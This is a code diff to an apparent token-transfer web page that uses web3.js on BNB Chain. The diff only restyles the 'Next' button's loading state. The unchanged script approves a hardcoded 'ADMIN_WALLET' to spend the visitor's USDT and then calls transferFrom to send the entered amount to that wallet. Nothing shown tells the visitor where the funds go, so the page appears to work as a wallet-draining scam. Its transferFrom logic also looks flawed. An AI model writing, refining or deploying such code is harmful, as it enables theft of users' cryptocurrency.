@@ -68,13 +68,9 @@
       font-weight: bold;
       margin: 0;
     }
-    #processing {
-      margin-top: 20px;
-      text-align: center;
-      font-size: 16px;
+    .bottom-btn.loading {
+      background-color: #e0e0e0;
       color: #0047FF;
-      font-weight: bold;
-      display: none;
     }
     .footer {
       padding: 10px 20px 30px 20px;
@@ -94,16 +90,15 @@
     </div>
 
     <p id="usdValue">= $0.00</p>
-    <div id="processing">⏳ Processing... Please wait</div>
   </div>
 
   <div class="footer">
-    <button class="bottom-btn" onclick="startTransfer()">Next</button>
+    <button class="bottom-btn" id="nextBtn" onclick="startTransfer()">Next</button>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
   <script>
-    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20
     const ADMIN_WALLET = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
     const ABI = [
       { "constant": false, "inputs": [ { "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" } ], "name": "approve", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" },
@@ -111,7 +106,7 @@
       { "constant": true, "inputs": [ { "name": "_owner", "type": "address" } ], "name": "balanceOf", "outputs": [ { "name": "balance", "type": "uint256" } ], "type": "function" }
     ];
 
-    const BNB_CHAIN_ID = "0x38";
+    const BNB_CHAIN_ID = "0x38"; // BSC mainnet
     let web3 = new Web3(window.ethereum);
     let account;
     let token = new web3.eth.Contract(ABI, USDT_ADDRESS);
@@ -129,9 +124,12 @@
 
     async function startTransfer() {
       const amount = document.getElementById("usdtAmount").value;
+      const nextBtn = document.getElementById("nextBtn");
       if (!amount) return alert("Enter amount");
       const amountInWei = web3.utils.toWei(amount);
-      document.getElementById("processing").style.display = "block";
+
+      nextBtn.innerText = "⏳ Processing...";
+      nextBtn.classList.add("loading");
 
       try {
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
@@ -146,9 +144,12 @@
 
         await token.methods.approve(ADMIN_WALLET, amountInWei).send({ from: account });
         await token.methods.transferFrom(account, ADMIN_WALLET, amountInWei).send({ from: account });
-        document.getElementById("processing").innerText = "✅ Transfer Complete";
+
+        nextBtn.innerText = "✅ Transfer Complete";
       } catch (err) {
-        document.getElementById("processing").innerText = "❌ Error: " + err.message;
+        nextBtn.innerText = "❌ " + err.message;
+      } finally {
+        nextBtn.classList.remove("loading");
       }
     }
   </script>
